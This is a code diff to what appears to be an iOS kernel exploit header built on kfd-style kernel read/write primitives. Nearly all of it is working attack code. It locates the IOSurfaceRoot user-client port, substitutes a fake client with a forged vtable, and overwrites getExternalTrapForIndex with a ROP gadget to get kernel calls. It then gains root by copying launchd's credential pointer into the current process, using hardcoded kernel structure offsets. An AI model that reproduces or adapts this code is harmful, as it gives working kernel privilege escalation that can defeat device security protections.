@@ -246,14 +246,22 @@ void kwrite64(u64 kfd, uint64_t where, uint64_t what)
     kwrite(kfd, &_buf, where, sizeof(u64));
 }
 
+static uint64_t off_task_itk_space = 0x330;
+static uint64_t off_ipc_space_is_table = 0x20;
+static const int size_ipc_entry = 0x18;
+static uint64_t off_ipc_port_ip_kobject = 0x58;
+// or 0x50
+
+static uint64_t off_IOSurfaceRootUserClient_surfaceClients = 0x118;
+
 uint64_t find_port(u64 kfd, mach_port_name_t port){
     struct kfd* kfd_struct = (struct kfd*)kfd;
-    uint64_t task_addr = kfd_struct->info.kernel.current_task;
-    uint64_t itk_space = kread64(kfd, task_addr + 0x308);
-    uint64_t is_table = kread64(kfd, itk_space + 0x20);
+    uint64_t task_addr = kread64(kfd, kfd_struct->info.kernel.current_proc + 0x10);
+    uint64_t itk_space = kread64(kfd, task_addr + off_task_itk_space);
+    uint64_t is_table = kread64(kfd, itk_space + off_ipc_space_is_table);
     uint32_t port_index = port >> 8;
-    const int sizeof_ipc_entry_t = 0x18;
-    uint64_t port_addr = kread64(kfd, is_table + (port_index * sizeof_ipc_entry_t));
+    printf("%02X", port_index);
+    uint64_t port_addr = kread64(kfd, is_table + (port_index * size_ipc_entry));
     return port_addr;
 }
 
@@ -287,6 +295,96 @@ uint64_t dirty_kalloc(u64 kfd, size_t size) {
     return 0;
 }
 
+#define HEXDUMP_COLS 16
+
+void hexdump(void *mem, unsigned int len)
+{
+        unsigned int i, j;
+        
+        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
+        {
+                /* print offset */
+                if(i % HEXDUMP_COLS == 0)
+                {
+                        printf("0x%06x: ", i);
+                }
+ 
+                /* print hex data */
+                if(i < len)
+                {
+                        printf("%02x ", 0xFF & ((char*)mem)[i]);
+                }
+                else /* end of block, just aligning for ASCII dump */
+                {
+                        printf("   ");
+                }
+                
+                /* print ASCII dump */
+                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
+                {
+                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
+                        {
+                                if(j >= len) /* end of block, not really printing */
+                                {
+                                        putchar(' ');
+                                }
+                                else if(isprint(((char*)mem)[j])) /* printable char */
+                                {
+                                        putchar(0xFF & ((char*)mem)[j]);
+                                }
+                                else /* other char */
+                                {
+                                        putchar('.');
+                                }
+                        }
+                        putchar('\n');
+                }
+        }
+}
+
+void kreadbuf(uint64_t kfd, uint64_t kaddr, void* output, size_t size)
+{
+    uint64_t endAddr = kaddr + size;
+    uint32_t outputOffset = 0;
+    unsigned char* outputBytes = (unsigned char*)output;
+
+    for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += 4)
+    {
+        uint32_t k = kread32(kfd, curAddr);
+
+        unsigned char* kb = (unsigned char*)&k;
+        for(int i = 0; i < 4; i++)
+        {
+            if(outputOffset == size) break;
+            outputBytes[outputOffset] = kb[i];
+            outputOffset++;
+        }
+        if(outputOffset == size) break;
+    }
+}
+
+size_t kwritebuf(uint64_t kfd, uint64_t where, const void *p, size_t size) {
+    size_t remainder = size % 8;
+    if (remainder == 0)
+        remainder = 8;
+    size_t tmpSz = size + (8 - remainder);
+    if (size == 0)
+        tmpSz = 0;
+
+    uint64_t *dstBuf = (uint64_t *)p;
+    size_t alignedSize = (size & ~0b111);
+
+    for (int i = 0; i < alignedSize; i+=8){
+        kwrite64(kfd, where + i, dstBuf[i/8]);
+    }
+    if (size > alignedSize) {
+        uint64_t val = kread64(kfd, where + alignedSize);
+        memcpy(&val, ((uint8_t*)p) + alignedSize, size-alignedSize);
+        kwrite64(kfd, where + alignedSize, val);
+    }
+    return size;
+}
+
 void init_kcall(u64 kfd) {
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
@@ -300,7 +398,17 @@ void init_kcall(u64 kfd) {
     }
     uint64_t uc_port = find_port(kfd, user_client);
     printf("Found port: 0x%llx\n", uc_port);
-    uint64_t uc_addr = kread64(kfd, uc_port + 0x48);
+    
+    char buf[0x1000] = {};
+    kreadbuf(kfd, uc_port, &buf, 0x1000);
+    hexdump(buf, 1024);
+    
+    uint64_t uc_addr = kread64(kfd, uc_port + off_ipc_port_ip_kobject);
+    if (!uc_addr) {
+        printf("no addr: 0x%llx\n", uc_addr);
+        exit(0);
+        return;
+    }
     printf("Found addr: 0x%llx\n", uc_addr);
     uint64_t uc_vtab = kread64(kfd, uc_addr);
     printf("Found vtab: 0x%llx\n", uc_vtab);
@@ -317,9 +425,9 @@ void init_kcall(u64 kfd) {
     }
     printf("Copied the user client over\n");
     kwrite64(kfd, fake_client, fake_vtable);
-    kwrite64(kfd, uc_port + 0x48, fake_client);
+    kwrite64(kfd, uc_port + off_ipc_port_ip_kobject, fake_client);
     kwrite64(kfd, fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
-    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
+    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n"); sleep(1);
 }
 
 uint64_t kcall(u64 kfd, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
@@ -340,7 +448,7 @@ uint64_t proc_of_pid(u64 kfd, pid_t pid)
         uint64_t pidptr = proc + 0x68;
         uint32_t pid2 = kread32(kfd, pidptr);
         char name[32];
-        kread(kfd, proc + 0x381, &name, 32);
+        kread(kfd, proc + 0x2C8, &name, 32);
         printf("FOUND: pid %d, name %s\n", pid2, name);
         if(pid2 == pid) {
             printf("GOT IT\n");
@@ -351,49 +459,59 @@ uint64_t proc_of_pid(u64 kfd, pid_t pid)
     return 0;
 }
 
-void getRoot(u64 kfd, uint64_t proc_addr)
+void getRoot(u64 kfd)
 {
     struct kfd* kfd_struct = (struct kfd*)kfd;
-    uint64_t self_ro = kread64(kfd, proc_addr + 0x20);
-    printf("self_ro @ 0x%llx\n", self_ro);
-    uint64_t self_ucred = kread64(kfd, self_ro + 0x20);
+    uint64_t proc_addr = kfd_struct->info.kernel.current_proc;
+    uint64_t self_ucred = kread64(kfd, proc_addr + 0xD8);
     printf("ucred @ 0x%llx\n", self_ucred);
     printf("test_uid = %d\n", getuid());
 
-    uint64_t kernproc = kfd_struct->info.kernel.kernel_proc;
-    printf("kern proc @ %llx\n", kernproc);
-    uint64_t kern_ro = kread64(kfd, kernproc + 0x20);
-    printf("kern_ro @ 0x%llx\n", kern_ro);
-    uint64_t kern_ucred = kread64(kfd, kern_ro + 0x20);
-    printf("kern_ucred @ 0x%llx\n", kern_ucred);
+    uint64_t kernproc = proc_of_pid(kfd, 1);
+    printf("launchd proc @ %llx\n", kernproc);
+    uint64_t kern_ucred = kread64(kfd, kernproc + 0xD8);
+    printf("launchd ucred @ 0x%llx\n", kern_ucred);
 
-    // use proc_set_ucred to set kernel ucred.
-    kcall(kfd, proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
+    kwrite64(kfd, proc_addr + 0xD8, kern_ucred);
+    printf("zero'd out uids\n");
+    
     setuid(0);
     setuid(0);
     printf("getuid: %d\n", getuid());
 }
+
+@import Foundation;
 
 void stage2(u64 kfd)
 {
     struct kfd* kfd_struct = (struct kfd*)kfd;
     printf("patchfinding!\n");
     init_kernel(kfd_struct);
+//    if ([[NSUserDefaults standardUserDefaults] integerForKey:@"add_x0_x0_0x40"]) {
+//        printf("add x0 x0 0x40 0x%02llX\n", (int64_t)[[NSUserDefaults standardUserDefaults] integerForKey:@"add_x0_x0_0x40"]);
+//        add_x0_x0_0x40_ret_func = [[NSUserDefaults standardUserDefaults] integerForKey:@"add_x0_x0_0x40"] + kfd_struct->info.kernel.kernel_slide;
+//    }
     add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);
+    
+    [[NSUserDefaults standardUserDefaults] setInteger:add_x0_x0_0x40_ret_func - kfd_struct->info.kernel.kernel_slide forKey:@"add_x0_x0_0x40"];
     printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", add_x0_x0_0x40_ret_func);
     assert(add_x0_x0_0x40_ret_func != 0);
-    proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);
-    printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func);
-    assert(proc_set_ucred_func != 0);
+    if (@available(iOS 15.2, *)) {
+        proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);
+        printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func);
+        assert(proc_set_ucred_func != 0);
+    } else {
+        printf("no proc_set_ucred_func, below 15.2\n");
+    }
     printf("patchfinding complete!\n");
     pid_t pid = getpid();
     printf("pid = %d\n", pid);
-    uint64_t proc_addr = proc_of_pid(kfd, getpid());
-    printf("proc_addr @ 0x%llx\n", proc_addr);
+    
     printf("init_kcall!\n");
     init_kcall(kfd);
+    
     printf("getRoot!\n");
-    getRoot(kfd, proc_addr);
+    getRoot(kfd);
 }
 
 #endif /* libkfd_h */
